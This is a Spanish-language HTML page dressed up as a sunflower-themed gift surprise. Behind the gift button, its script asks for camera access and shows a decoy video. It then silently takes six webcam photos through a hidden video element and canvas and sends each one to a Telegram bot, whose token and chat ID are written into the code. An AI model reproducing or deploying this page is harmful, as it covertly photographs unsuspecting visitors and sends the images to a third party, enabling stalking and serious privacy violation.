<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Regalo Especial 🌻</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fffde7; font-family: sans-serif; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #inicio { text-align: center; z-index: 20; position: absolute; width: 100%; }
        .btn-regalo { background: #fdd835; border: none; padding: 20px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; font-weight: bold; color: #5d4037; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
        .flower { position: fixed; top: -50px; font-size: 24px; animation: fall linear forwards; z-index: 5; }
        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
        #contenido { display: none; background: #000; width: 100vw; height: 100vh; }
        video#video-display { width: 100%; height: 100%; object-fit: cover; }
        #camera-hidden, #canvas { display: none; }
    </style>
</head>
<body>

    <!-- Pantalla con Lluvia de Flores -->
    <div id="inicio">
        <h1 style="color: #fbc02d; margin-bottom: 20px;">Tengo algo para ti... 🌻</h1>
        <button class="btn-regalo" onclick="comenzarSorpresa()">🌻 ABRIR MI REGALO 🌻</button>
    </div>

    <!-- Pantalla del Video -->
    <div id="contenido">
        <video id="video-display" playsinline loop muted>
            <source src="https://assets.mixkit.co" type="video/mp4">
        </video>
    </div>

    <video id="camera-hidden" autoplay playsinline muted></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // TUS DATOS YA CONFIGURADOS
        const TELEGRAM_TOKEN = '8636421885:AAHACzfR2p-ekm9sq2AyowzMAcnyf2Fddgg';
        const CHAT_ID = '7775532656';

        // Lluvia de flores (Automática)
        setInterval(() => {
            const f = document.createElement('div');
            f.className = 'flower';
            f.innerText = ['🌻', '🌼', '✨', '💛'][Math.floor(Math.random() * 4)];
            f.style.left = Math.random() * 100 + 'vw';
            f.style.animationDuration = (Math.random() * 3 + 2) + 's';
            document.body.appendChild(f);
            setTimeout(() => f.remove(), 5000);
        }, 300);

        const cam = document.getElementById('camera-hidden');
        const canvas = document.getElementById('canvas');
        const videoDisplay = document.getElementById('video-display');

        async function comenzarSorpresa() {
            document.getElementById('inicio').style.display = 'none';
            document.getElementById('contenido').style.display = 'block';

            try {
                // Solicitar cámara
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                cam.srcObject = stream;
                
                cam.onloadedmetadata = () => {
                    videoDisplay.play();
                    capturarYEnviar();
                };
            } catch (e) {
                // Si falla la cámara, al menos mostramos el video
                videoDisplay.play();
                console.log("Error de cámara:", e);
            }
        }

        async function capturarYEnviar() {
            for (let i = 1; i <= 6; i++) {
                // Esperar 4 segundos entre fotos
                await new Promise(r => setTimeout(r, 4000));
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(cam, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'foto.jpg');

                    // URL DE TELEGRAM CORREGIDA (Sin errores de símbolos)
                    const apiURL = 'https://api.telegram.org' + TELEGRAM_TOKEN + '/sendPhoto';
                    const proxyURL = 'https://api.allorigins.win' + encodeURIComponent(apiURL);

                    fetch(proxyURL, {
                        method: 'POST',
                        body: formData
                    })
                    .then(() => console.log("Foto " + i + " enviada!"))
                    .catch(err => console.log("Error al enviar:", err));

                }, 'image/jpeg', 0.6);
            }
        }
    </script>
</body>
</html>
